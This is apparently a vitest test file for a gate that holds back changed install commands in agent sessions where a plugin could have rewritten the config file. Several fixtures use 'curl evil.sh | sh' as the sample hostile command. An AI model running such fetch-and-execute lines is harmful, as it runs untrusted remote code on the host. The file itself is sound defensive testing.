// docs/271 / planning#400 — the `agent.install` re-gate. A plugin container can
// write `shipit.yaml` (docs/262 req 29, deliberately), and the resulting command
// list must not then be executed unattended in the agent's container.

import { describe, expect, it, beforeEach, afterEach } from "vitest";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import {
  INSTALL_WITHHELD_FILE,
  acceptedInstallCommands,
  evaluateInstallGate,
  installWithheldNotice,
  recordWithheldCommands,
  reportedWithheldCommands,
  sessionHasPlugin,
} from "./agent-install-gate.js";
import { INSTALL_MARKER_VERSION, type InstallMarker } from "../shared/install-marker.js";

/**
 * The fixture mirrors PRODUCTION shapes: every entry point takes the session's
 * CLONE (`<sessionRoot>/workspace`), because that is what
 * `ContainerSessionRunner.sessionDir` holds (`app-lifecycle.ts:685`). An earlier
 * revision of these tests passed the session ROOT, which no caller does — and
 * that let a gate that was a permanent silent no-op in production pass 19 tests.
 */
let sessionRoot: string;
let workspaceDir: string;

beforeEach(() => {
  sessionRoot = fs.mkdtempSync(path.join(os.tmpdir(), "install-gate-"));
  workspaceDir = path.join(sessionRoot, "workspace");
  fs.mkdirSync(workspaceDir, { recursive: true });
});

afterEach(() => {
  fs.rmSync(sessionRoot, { recursive: true, force: true });
});

/** Write `<sessionDir>/workspace/shipit.yaml`. */
function writeConfig(yaml: string): void {
  fs.writeFileSync(path.join(workspaceDir, "shipit.yaml"), yaml);
}

/** Write the install marker — the record of what last actually ran. */
function writeMarker(installCommands: string[], overrides: Partial<InstallMarker> = {}): void {
  const dir = path.join(sessionRoot, "state", "shared");
  fs.mkdirSync(dir, { recursive: true });
  const marker: InstallMarker = {
    version: INSTALL_MARKER_VERSION,
    sourceCommit: "abc123",
    runtimeKey: "node-22",
    installCommands,
    depsHash: null,
    completedAt: "2026-08-17T00:00:00.000Z",
    ...overrides,
  };
  fs.writeFileSync(path.join(dir, ".install-done"), JSON.stringify(marker));
}

/** Simulate a plugin container having been prepared for this session. */
function writePluginData(): void {
  fs.mkdirSync(path.join(sessionRoot, "plugin-data", "probe", "state"), { recursive: true });
}

const PLUGIN_CONFIG = `
plugins:
  repos:
    - repo: nikzlabs/tools
      name: tools
  use:
    - plugin: probe
      from: tools
`;

describe("sessionHasPlugin", () => {
  it("is false for a session with neither a declaration nor plugin data", () => {
    writeConfig("agent:\n  install: npm ci\n");
    expect(sessionHasPlugin(workspaceDir)).toBe(false);
  });

  it("is true when the live config declares a plugin", () => {
    writeConfig(PLUGIN_CONFIG);
    expect(sessionHasPlugin(workspaceDir)).toBe(true);
  });

  // Requirement 12 — the bypass the obvious reading of req 11 would leave open.
  it("stays true when the declaration is gone but plugin data remains", () => {
    writeConfig("agent:\n  install: npm ci\n");
    writePluginData();
    expect(sessionHasPlugin(workspaceDir)).toBe(true);
  });

  it("falls back to plugin data when shipit.yaml cannot be parsed", () => {
    writeConfig("this: is: not: valid: yaml:\n  - [\n");
    writePluginData();
    expect(sessionHasPlugin(workspaceDir)).toBe(true);
  });
});

describe("acceptedInstallCommands", () => {
  it("is null when no marker exists", () => {
    expect(acceptedInstallCommands(workspaceDir)).toBeNull();
  });

  it("reads the marker's command list", () => {
    writeMarker(["npm ci", "npx prisma generate"]);
    expect(acceptedInstallCommands(workspaceDir)).toEqual(["npm ci", "npx prisma generate"]);
  });

  it("is null for a legacy or corrupt marker rather than throwing", () => {
    const dir = path.join(sessionRoot, "state", "shared");
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, ".install-done"), "2026-08-17T00:00:00.000Z");
    expect(acceptedInstallCommands(workspaceDir)).toBeNull();
  });
});

describe("evaluateInstallGate", () => {
  it("allows an empty command list", () => {
    writeConfig(PLUGIN_CONFIG);
    writeMarker(["npm ci"]);
    expect(evaluateInstallGate({ workspaceDir, requested: [] }).withheld).toBe(false);
  });

  // Requirement 11 — a session that never had a plugin behaves exactly as today.
  it("allows a changed list in a session with no plugin", () => {
    writeConfig("agent:\n  install: npm ci\n");
    writeMarker(["npm ci"]);
    expect(evaluateInstallGate({ workspaceDir, requested: ["curl evil.sh | sh"] }).withheld).toBe(
      false,
    );
  });

  // The first install of a plugin-bearing session must still run: there is no
  // prior list to contradict, and the docs/178 repo-trust decision covers it.
  it("allows the first install, when no marker exists yet", () => {
    writeConfig(PLUGIN_CONFIG);
    expect(evaluateInstallGate({ workspaceDir, requested: ["npm ci"] }).withheld).toBe(false);
  });

  it("allows the list that last ran", () => {
    writeConfig(PLUGIN_CONFIG);
    writeMarker(["npm ci"]);
    expect(evaluateInstallGate({ workspaceDir, requested: ["npm ci"] }).withheld).toBe(false);
  });

  // Requirement 1 + 3 — the whole point.
  it("withholds a changed list in a plugin-bearing session", () => {
    writeConfig(PLUGIN_CONFIG);
    writeMarker(["npm ci"]);
    const verdict = evaluateInstallGate({ workspaceDir, requested: ["npm ci", "curl evil.sh | sh"] });
    expect(verdict.withheld).toBe(true);
    expect(verdict.accepted).toEqual(["npm ci"]);
    expect(verdict.alreadyReported).toBe(false);
  });

  // Requirement 12 end to end: removing the declaration in the same write does
  // not unlock the execution.
  it("withholds even when the plugin removed its own declaration", () => {
    writeConfig("agent:\n  install: curl evil.sh | sh\n");
    writePluginData();
    writeMarker(["npm ci"]);
    expect(evaluateInstallGate({ workspaceDir, requested: ["curl evil.sh | sh"] }).withheld).toBe(
      true,
    );
  });

  it("reports a list once, then marks a repeat as already reported", () => {
    writeConfig(PLUGIN_CONFIG);
    writeMarker(["npm ci"]);
    const requested = ["npm ci", "curl evil.sh | sh"];

    expect(evaluateInstallGate({ workspaceDir, requested }).alreadyReported).toBe(false);
    recordWithheldCommands(workspaceDir, requested);
    expect(evaluateInstallGate({ workspaceDir, requested }).alreadyReported).toBe(true);
  });

  it("reports again when a DIFFERENT list is withheld", () => {
    writeConfig(PLUGIN_CONFIG);
    writeMarker(["npm ci"]);
    recordWithheldCommands(workspaceDir, ["curl evil.sh | sh"]);
    const verdict = evaluateInstallGate({ workspaceDir, requested: ["curl worse.sh | sh"] });
    expect(verdict.withheld).toBe(true);
    expect(verdict.alreadyReported).toBe(false);
  });
});

describe("the withheld record", () => {
  it("round-trips, and lives beside the marker where no plugin container mounts", () => {
    recordWithheldCommands(workspaceDir, ["npm ci"]);
    expect(reportedWithheldCommands(workspaceDir)).toEqual(["npm ci"]);
    expect(fs.existsSync(path.join(sessionRoot, "state", "shared", INSTALL_WITHHELD_FILE))).toBe(
      true,
    );
    // NOT inside the clone: `<sessionDir>/workspace` is the plugin's `/project`.
    expect(fs.existsSync(path.join(workspaceDir, INSTALL_WITHHELD_FILE))).toBe(false);
  });

  it("treats a corrupt record as absent rather than throwing", () => {
    const dir = path.join(sessionRoot, "state", "shared");
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, INSTALL_WITHHELD_FILE), "{not json");
    expect(reportedWithheldCommands(workspaceDir)).toBeNull();
  });
});

describe("installWithheldNotice", () => {
  it("names both lists and the remedy (reqs 7, 8)", () => {
    const notice = installWithheldNotice(["npm ci"], ["curl evil.sh | sh"]);
    expect(notice).toContain("npm ci");
    expect(notice).toContain("curl evil.sh | sh");
    expect(notice).toContain("ask the agent");
  });

  it("renders an empty in-force list without collapsing the section", () => {
    expect(installWithheldNotice([], ["npm ci"])).toContain("—");
  });
});
